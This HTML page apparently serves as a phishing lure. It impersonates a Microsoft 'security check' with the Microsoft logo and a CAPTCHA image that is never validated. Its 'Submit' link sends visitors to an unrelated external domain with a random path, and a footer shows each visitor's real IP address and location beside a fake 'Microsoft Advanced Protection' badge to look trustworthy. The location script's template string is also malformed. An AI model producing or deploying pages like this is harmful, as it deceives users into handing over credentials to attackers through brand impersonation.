<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Authenticating</title>
<style>
/* General Body Styling */
body {
font-family: Arial, sans-serif;
background-color: #f9f9f9;
margin: 0;
padding: 0;
display: flex;
flex-direction: column;
justify-content: space-between;
align-items: center;
min-height: 100vh;
}

/* Container Styling */
.container {
background-color: #fff;
border: 1px solid #ddd;
border-radius: 8px;
width: 400px;
text-align: center;
padding: 20px;
box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

/* Logo Styling */
.logo {
margin-bottom: 20px;
}

.logo img {
width: 140px;
}

/* Title Styling */
.title {
font-size: 18px;
font-weight: bold;
color: #333;
margin-bottom: 15px;
}

/* CAPTCHA Box Styling */
.captcha-container {
margin: 15px 0;
padding: 10px;
border: 1px solid #ddd;
border-radius: 5px;
background-color: #f1f1f1;
position: relative;
}

.captcha-container img {
display: block;
margin: 0 auto;
max-width: 100%;
height: auto;
}

.refresh-icon {
position: absolute;
top: 50%;
right: 10px;
transform: translateY(-50%);
cursor: pointer;
width: 20px;
}

/* Input Field Styling */
input[type="text"] {
width: 80%;
/* Adjust the width to make the input field smaller */
padding: 10px;
font-size: 16px;
margin: 10px 0;
border: 1px solid #ccc;
border-radius: 4px;
}

/* Button Styling */
.btn {
background-color: #0078d4;
color: #fff;
border: none;
padding: 12px 25px;
font-size: 16px;
border-radius: 4px;
cursor: pointer;
display: inline-block;
text-decoration: none;
}

.btn:hover {
background-color: #005a9e;
}

/* Footer Styling */
.footer {
background-color: #f9f9f9;
padding: 10px 20px;
text-align: center;
font-size: 12px;
color: #666;
width: 100%;
}

.footer .green {
color: green;
font-weight: bold;
text-decoration: none;
}

.footer .green:hover {
text-decoration: underline;
}

.footer span {
font-weight: bold;
color: #333;
}
</style>
</head>

<body>
<div class="container">
<!-- Microsoft Logo -->
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" style="width: 23px;"></div><!-- Title -->
<div class="title">Please complete the security check</div><!-- CAPTCHA Container -->
<div class="captcha-container"><img src="https://i.postimg.cc/50gcHSW-V/Screenshot-2024-11-18-at-9-29-48-pm.png" alt="Captcha Image" style="margin: 0 auto; display: block; width: 132px;"></div><!-- Input Field --> <input type="text" placeholder="Enter the code above" class="fr-rounded"> <!-- Verify Button --> <a href="https://payoffstatement.probusinessapps.com/9rhNk/" class="btn">Submit</a>
</div><!-- Footer Section -->
<div class="footer">
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><br></p>
<p style="text-align: left;"><span style="font-size: 11px;">Your IP Address:&nbsp;</span><span id="ip-address" style="font-size: 11px;">Loading...</span></p>
<p style="text-align: left;"><span style="font-size: 11px;">Location: </span><span id="location" style="font-size: 11px; color: rgb(226, 80, 65);">undefined, undefined</span></p>
<p style="text-align: left;"><span style="font-size: 11px;">Protection: </span><a href="#" class="green"><span style="font-size: 11px; color: rgb(65, 168, 95);">Microsoft Advanced Protection</span></a></p>
</div><!-- JavaScript to Fetch IP and Location -->
<script>
fetch('https://ipapi.co/json/')
.then(response => response.json())
.then(data => {
document.getElementById('ip-address').textContent = data.ip;
document.getElementById('location').textContent = ${data.city}, ${data.region}, ${data.country_name};
})
.catch(error => {
console.error('Error fetching IP information:', error);
});
</script>
</body>

</html>
